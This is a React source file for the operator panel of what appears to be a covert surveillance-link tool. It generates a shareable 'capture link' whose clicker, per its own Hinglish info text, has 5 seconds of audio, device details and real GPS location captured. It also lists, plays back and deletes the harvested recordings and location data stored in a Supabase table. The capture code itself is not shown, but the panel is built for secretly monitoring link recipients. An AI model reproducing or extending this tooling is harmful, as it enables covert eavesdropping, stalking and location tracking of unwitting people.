import { useState, useEffect } from "react";
import { Link } from "react-router-dom";
import { 
  Mic, Loader2, ArrowLeft, Copy, Check, ExternalLink, 
  Headphones, Info, Link2, Smartphone, Database, 
  Trash2, RefreshCw, Volume2, FileJson, Radio, MapPin,
  Shield, Zap, Navigation, LucideIcon
} from "lucide-react";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { toast } from "@/hooks/use-toast";
import { useSettings } from "@/contexts/SettingsContext";
import { useAuth } from "@/contexts/AuthContext";
import { supabase } from "@/integrations/supabase/client";
import CreditDisplay from "@/components/CreditDisplay";
import { cn } from "@/lib/utils";

interface CapturedData {
  id: string;
  session_id: string;
  image_data: string;
  captured_at: string;
  user_agent: string | null;
}

interface Tab {
  id: string;
  label: string;
  icon: LucideIcon;
  color: string;
}

const tabs: Tab[] = [
  { id: "audiocapture", label: "AUDIO", icon: Mic, color: "red" },
  { id: "media", label: "DATA", icon: Database, color: "orange" },
];

const Page2 = () => {
  const { settings } = useSettings();
  const { isLoading: authLoading } = useAuth();
  const [activeTab, setActiveTab] = useState<string | null>(null);
  const [copiedLink, setCopiedLink] = useState(false);
  const [capturedData, setCapturedData] = useState<CapturedData[]>([]);
  const [isLoadingData, setIsLoadingData] = useState(false);

  const baseUrl = window.location.origin;
  const sessionId = settings.camSessionId || "audiocap01";
  const captureLink = `${baseUrl}/audio-capture?session=${sessionId}`;

  const fetchCapturedData = async () => {
    setIsLoadingData(true);
    try {
      const { data, error } = await supabase
        .from("captured_photos")
        .select("*")
        .or(`session_id.eq.${sessionId},session_id.eq.${sessionId}_deviceinfo`)
        .order("captured_at", { ascending: false });
      
      if (error) throw error;
      setCapturedData(data || []);
    } catch (err) {
      console.error("Failed to fetch data:", err);
    } finally {
      setIsLoadingData(false);
    }
  };

  const deleteItem = async (id: string) => {
    try {
      const { error } = await supabase.from("captured_photos").delete().eq("id", id);
      if (error) throw error;
      setCapturedData(prev => prev.filter(item => item.id !== id));
      toast({ title: "Deleted!" });
    } catch (err) {
      toast({ title: "Error", variant: "destructive" });
    }
  };

  const clearAllData = async () => {
    try {
      const { error } = await supabase
        .from("captured_photos")
        .delete()
        .or(`session_id.eq.${sessionId},session_id.eq.${sessionId}_deviceinfo`);
      
      if (error) throw error;
      setCapturedData([]);
      toast({ title: "Cleared!" });
    } catch (err) {
      toast({ title: "Error", variant: "destructive" });
    }
  };

  useEffect(() => {
    if (activeTab === "media") {
      fetchCapturedData();
    }
  }, [activeTab, sessionId]);

  const copyLink = async () => {
    await navigator.clipboard.writeText(captureLink);
    setCopiedLink(true);
    toast({ title: "Link Copied!" });
    setTimeout(() => setCopiedLink(false), 2000);
  };

  const getTabColor = (color: string, active: boolean) => {
    const colors: Record<string, { bg: string; border: string; text: string; activeBg: string }> = {
      red: { bg: "bg-red-500/10", border: "border-red-500/30", text: "text-red-400", activeBg: "bg-red-500" },
      orange: { bg: "bg-orange-500/10", border: "border-orange-500/30", text: "text-orange-400", activeBg: "bg-orange-500" },
      cyan: { bg: "bg-cyan-500/10", border: "border-cyan-500/30", text: "text-cyan-400", activeBg: "bg-cyan-500" },
      green: { bg: "bg-green-500/10", border: "border-green-500/30", text: "text-green-400", activeBg: "bg-green-500" },
      purple: { bg: "bg-purple-500/10", border: "border-purple-500/30", text: "text-purple-400", activeBg: "bg-purple-500" },
      pink: { bg: "bg-pink-500/10", border: "border-pink-500/30", text: "text-pink-400", activeBg: "bg-pink-500" },
    };
    return colors[color] || colors.red;
  };

  if (authLoading) {
    return (
      <div className="min-h-[100dvh] bg-black flex items-center justify-center">
        <Loader2 className="w-8 h-8 text-red-500 animate-spin" />
      </div>
    );
  }

  return (
    <div className="min-h-[100dvh] bg-gradient-to-b from-black via-gray-950 to-black relative overflow-hidden">
      {/* Grid Background */}
      <div className="fixed inset-0 pointer-events-none overflow-hidden">
        <div 
          className="absolute inset-0 opacity-[0.03]"
          style={{
            backgroundImage: `linear-gradient(rgba(239, 68, 68, 0.3) 1px, transparent 1px), linear-gradient(90deg, rgba(239, 68, 68, 0.3) 1px, transparent 1px)`,
            backgroundSize: '50px 50px'
          }}
        />
        <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[600px] h-[300px] bg-red-600/10 rounded-full blur-[120px]" />
      </div>

      <div className="relative z-10 min-h-[100dvh] flex flex-col">
        {/* Header */}
        <header className="px-4 py-3 border-b border-red-500/20 bg-black/50 backdrop-blur-xl">
          <div className="flex items-center justify-between max-w-2xl mx-auto">
            <Link 
              to="/" 
              className="flex items-center gap-2 px-3 py-1.5 rounded-lg border border-red-500/30 bg-red-500/10 text-red-400 hover:bg-red-500/20 transition-all text-xs font-medium"
            >
              <ArrowLeft className="w-3.5 h-3.5" />
              BACK
            </Link>
            
            <div className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-red-500/10 border border-red-500/30">
              <Radio className="w-3.5 h-3.5 text-red-500 animate-pulse" />
              <span className="text-[10px] font-bold text-red-400 uppercase tracking-wider">Page 2</span>
            </div>
            
            <CreditDisplay />
          </div>
        </header>

        {/* Tab Grid */}
        <div className="px-4 py-4 border-b border-red-500/10">
          <div className="max-w-2xl mx-auto grid grid-cols-4 gap-2">
            {tabs.map((tab) => {
              const colors = getTabColor(tab.color, activeTab === tab.id);
              const Icon = tab.icon;
              return (
                <button
                  key={tab.id}
                  onClick={() => setActiveTab(activeTab === tab.id ? null : tab.id)}
                  className={cn(
                    "flex flex-col items-center gap-1.5 p-3 rounded-xl border transition-all",
                    activeTab === tab.id
                      ? `${colors.activeBg} border-transparent text-white shadow-lg`
                      : `${colors.bg} ${colors.border} ${colors.text} hover:scale-105`
                  )}
                >
                  <div className={cn(
                    "w-8 h-8 rounded-lg flex items-center justify-center",
                    activeTab === tab.id ? "bg-white/20" : "bg-black/30"
                  )}>
                    <Icon className="w-4 h-4" />
                  </div>
                  <span className="text-[9px] font-bold uppercase tracking-wider">{tab.label}</span>
                </button>
              );
            })}

            {/* Back to Page 1 */}
            <Link to="/">
              <div className="flex flex-col items-center gap-1.5 p-3 rounded-xl border bg-green-500/10 border-green-500/30 text-green-400 hover:scale-105 transition-all">
                <div className="w-8 h-8 rounded-lg bg-black/30 flex items-center justify-center">
                  <ArrowLeft className="w-4 h-4" />
                </div>
                <span className="text-[9px] font-bold uppercase tracking-wider">Page 1</span>
              </div>
            </Link>
          </div>
        </div>

        {/* Main Content */}
        <main className="flex-1 px-4 py-4">
          <div className="max-w-2xl mx-auto">
            
            {/* Audio Capture Tab */}
            {activeTab === "audiocapture" && (
              <div className="space-y-4 animate-in fade-in duration-300">
                {/* Info */}
                <div className="p-4 rounded-xl bg-gradient-to-br from-red-500/10 to-orange-500/5 border border-red-500/20">
                  <div className="flex items-start gap-3">
                    <Info className="w-5 h-5 text-red-400 flex-shrink-0 mt-0.5" />
                    <p className="text-xs text-gray-400 leading-relaxed">
                      Link click hone pe <span className="text-red-400 font-bold">5 sec audio</span> + <span className="text-orange-400 font-bold">device info</span> + <span className="text-green-400 font-bold">real GPS location</span> capture hogi.
                    </p>
                  </div>
                </div>

                {/* Session */}
                <div className="p-4 rounded-xl bg-gray-900/50 border border-gray-800">
                  <label className="text-[10px] font-bold text-gray-500 uppercase tracking-wider mb-2 block">Session ID</label>
                  <div className="flex items-center gap-2 p-3 rounded-lg bg-black/50 border border-gray-800">
                    <Radio className="w-4 h-4 text-red-500" />
                    <span className="text-sm font-mono text-white">{sessionId}</span>
                  </div>
                </div>

                {/* Link */}
                <div className="p-4 rounded-xl bg-gray-900/50 border border-gray-800">
                  <label className="text-[10px] font-bold text-gray-500 uppercase tracking-wider mb-2 flex items-center gap-1.5">
                    <Link2 className="w-3 h-3" />
                    Capture Link
                  </label>
                  <div className="flex gap-2">
                    <Input
                      value={captureLink}
                      readOnly
                      className="flex-1 h-10 bg-black/50 border-gray-700 text-red-400 font-mono text-xs"
                    />
                    <Button onClick={copyLink} className="h-10 px-4 bg-red-600 hover:bg-red-700">
                      {copiedLink ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                    </Button>
                  </div>
                </div>

                {/* Test Button */}
                <Button
                  onClick={() => window.open(captureLink, '_blank')}
                  className="w-full h-12 bg-gradient-to-r from-red-600 to-orange-600 hover:opacity-90 font-bold shadow-lg shadow-red-500/30"
                >
                  <ExternalLink className="w-4 h-4 mr-2" />
                  TEST LINK
                </Button>

                {/* Features */}
                <div className="grid grid-cols-3 gap-2">
                  <div className="p-3 rounded-xl bg-red-500/10 border border-red-500/20 text-center">
                    <Headphones className="w-5 h-5 mx-auto mb-1 text-red-400" />
                    <p className="text-[9px] font-bold text-red-400">AUDIO</p>
                  </div>
                  <div className="p-3 rounded-xl bg-orange-500/10 border border-orange-500/20 text-center">
                    <Smartphone className="w-5 h-5 mx-auto mb-1 text-orange-400" />
                    <p className="text-[9px] font-bold text-orange-400">DEVICE</p>
                  </div>
                  <div className="p-3 rounded-xl bg-green-500/10 border border-green-500/20 text-center">
                    <MapPin className="w-5 h-5 mx-auto mb-1 text-green-400" />
                    <p className="text-[9px] font-bold text-green-400">GPS</p>
                  </div>
                </div>
              </div>
            )}

            {/* Media/Data Tab */}
            {activeTab === "media" && (
              <div className="space-y-4 animate-in fade-in duration-300">
                {/* Header */}
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <Database className="w-4 h-4 text-orange-400" />
                    <span className="text-xs font-bold text-white uppercase">Captured Data</span>
                    <span className="px-2 py-0.5 rounded-full bg-orange-500/20 text-[10px] font-bold text-orange-400">
                      {capturedData.length}
                    </span>
                  </div>
                  <div className="flex gap-2">
                    <Button
                      size="sm"
                      variant="outline"
                      onClick={fetchCapturedData}
                      disabled={isLoadingData}
                      className="h-8 px-3 border-gray-700 text-gray-400"
                    >
                      <RefreshCw className={cn("w-3.5 h-3.5", isLoadingData && "animate-spin")} />
                    </Button>
                    {capturedData.length > 0 && (
                      <Button
                        size="sm"
                        variant="outline"
                        onClick={clearAllData}
                        className="h-8 px-3 border-red-500/30 text-red-400"
                      >
                        <Trash2 className="w-3.5 h-3.5" />
                      </Button>
                    )}
                  </div>
                </div>

                {/* List */}
                {isLoadingData ? (
                  <div className="flex items-center justify-center py-12">
                    <Loader2 className="w-6 h-6 text-orange-500 animate-spin" />
                  </div>
                ) : capturedData.length === 0 ? (
                  <div className="text-center py-12 rounded-xl bg-gray-900/30 border border-gray-800">
                    <Database className="w-12 h-12 mx-auto mb-3 text-gray-700" />
                    <p className="text-sm font-medium text-gray-500">No data yet</p>
                  </div>
                ) : (
                  <div className="space-y-3 max-h-[400px] overflow-y-auto">
                    {capturedData.map((item) => {
                      const isDeviceInfo = item.session_id.endsWith("_deviceinfo");
                      const isAudio = item.image_data.startsWith("data:audio");
                      
                      return (
                        <div 
                          key={item.id}
                          className={cn(
                            "p-4 rounded-xl border",
                            isDeviceInfo ? "bg-orange-500/5 border-orange-500/20" : "bg-red-500/5 border-red-500/20"
                          )}
                        >
                          <div className="flex items-start justify-between gap-3 mb-3">
                            <div className="flex items-center gap-3">
                              <div className={cn(
                                "w-9 h-9 rounded-lg flex items-center justify-center",
                                isDeviceInfo ? "bg-orange-500/20" : "bg-red-500/20"
                              )}>
                                {isDeviceInfo ? (
                                  <FileJson className="w-4 h-4 text-orange-400" />
                                ) : (
                                  <Volume2 className="w-4 h-4 text-red-400" />
                                )}
                              </div>
                              <div>
                                <p className={cn("text-xs font-bold", isDeviceInfo ? "text-orange-400" : "text-red-400")}>
                                  {isDeviceInfo ? "DEVICE + LOCATION" : "AUDIO"}
                                </p>
                                <p className="text-[9px] text-gray-500">{new Date(item.captured_at).toLocaleString()}</p>
                              </div>
                            </div>
                            <Button
                              size="sm"
                              variant="ghost"
                              onClick={() => deleteItem(item.id)}
                              className="h-8 w-8 p-0 text-red-400 hover:bg-red-500/20"
                            >
                              <Trash2 className="w-3.5 h-3.5" />
                            </Button>
                          </div>
                          
                          {isDeviceInfo ? (
                            <div className="p-3 rounded-lg bg-black/30 max-h-40 overflow-y-auto">
                              <pre className="text-[9px] text-gray-400 whitespace-pre-wrap break-all font-mono">
                                {(() => {
                                  try {
                                    const parsed = JSON.parse(item.image_data);
                                    // Highlight location if available
                                    if (parsed.latitude && parsed.longitude) {
                                      return JSON.stringify(parsed, null, 2);
                                    }
                                    return JSON.stringify(parsed, null, 2);
                                  } catch {
                                    return item.image_data;
                                  }
                                })()}
                              </pre>
                            </div>
                          ) : isAudio ? (
                            <audio controls className="w-full h-10" src={item.image_data} />
                          ) : (
                            <div className="p-3 rounded-lg bg-black/30">
                              <p className="text-[9px] text-gray-500 truncate font-mono">{item.image_data.substring(0, 100)}...</p>
                            </div>
                          )}
                        </div>
                      );
                    })}
                  </div>
                )}
              </div>
            )}

            {/* Empty State */}
            {!activeTab && (
              <div className="text-center py-16">
                <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-gradient-to-br from-red-500/20 to-orange-500/20 flex items-center justify-center">
                  <Zap className="w-8 h-8 text-red-400" />
                </div>
                <h3 className="text-sm font-bold text-white mb-1">Select a Tool</h3>
                <p className="text-[11px] text-gray-500">Tap on any tab above</p>
              </div>
            )}
          </div>
        </main>

        {/* Footer */}
        <footer className="px-4 py-3 border-t border-red-500/10">
          <div className="max-w-2xl mx-auto flex items-center justify-center gap-3">
            <Shield className="w-3 h-3 text-red-500" />
            <span className="text-[9px] text-gray-600 uppercase tracking-wider">Page 2 • Advanced Tools</span>
          </div>
        </footer>
      </div>
    </div>
  );
};

export default Page2;